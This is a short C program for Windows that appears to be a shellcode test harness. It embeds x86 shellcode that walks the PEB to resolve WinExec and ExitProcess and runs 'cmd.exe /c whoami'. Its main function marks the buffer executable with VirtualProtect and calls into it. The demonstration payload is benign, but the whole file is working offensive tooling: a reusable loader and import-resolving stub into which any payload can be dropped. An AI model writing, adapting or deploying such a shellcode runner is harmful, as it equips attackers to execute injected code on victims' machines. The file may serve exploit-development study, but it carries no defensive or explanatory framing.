#include <stdio.h>
#include <string.h>
#include <windows.h>

unsigned char shellcode[] = {
  0xeb, 0x44, 0x8b, 0x44, 0x24, 0x04, 0x8b, 0x58, 0x3c, 0x01, 0xc3, 0x8b,
  0x5b, 0x78, 0x01, 0xc3, 0x8b, 0x53, 0x20, 0x01, 0xc2, 0x8b, 0x43, 0x18,
  0x48, 0x8b, 0x4c, 0x24, 0x0c, 0x8b, 0x7c, 0x24, 0x08, 0x8b, 0x34, 0x82,
  0x03, 0x74, 0x24, 0x04, 0xf3, 0xa6, 0x75, 0xec, 0x8b, 0x73, 0x24, 0x03,
  0x74, 0x24, 0x04, 0x66, 0x8b, 0x04, 0x46, 0x8b, 0x73, 0x1c, 0x03, 0x74,
  0x24, 0x04, 0x8b, 0x04, 0x86, 0x03, 0x44, 0x24, 0x04, 0xc3, 0x31, 0xed,
  0x64, 0x8b, 0x5d, 0x30, 0x8b, 0x5b, 0x0c, 0x8b, 0x5b, 0x14, 0x8b, 0x1b,
  0x8b, 0x1b, 0x8b, 0x5b, 0x10, 0x6a, 0x07, 0xeb, 0x23, 0x53, 0xe8, 0x9f,
  0xff, 0xff, 0xff, 0x55, 0xeb, 0x26, 0x8b, 0x34, 0x24, 0x66, 0x89, 0x6e,
  0x11, 0xff, 0xd0, 0x6a, 0x0b, 0xeb, 0x31, 0x8b, 0x5c, 0x24, 0x0c, 0x53,
  0xe8, 0x85, 0xff, 0xff, 0xff, 0x55, 0xff, 0xd0, 0xe8, 0xd8, 0xff, 0xff,
  0xff, 0x57, 0x69, 0x6e, 0x45, 0x78, 0x65, 0x63, 0xe8, 0xd5, 0xff, 0xff,
  0xff, 0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x20, 0x2f, 0x63, 0x20,
  0x77, 0x68, 0x6f, 0x61, 0x6d, 0x69, 0x30, 0x30, 0xe8, 0xca, 0xff, 0xff,
  0xff, 0x45, 0x78, 0x69, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73
};

int main(void) {
  DWORD flag = 0;
  int len = strlen(shellcode);
  printf("[*] shellcode length: %d\n", len);
  VirtualProtect(shellcode, len, PAGE_EXECUTE_READWRITE, &flag);
  (*(void (*)())shellcode)();
  return 0;
}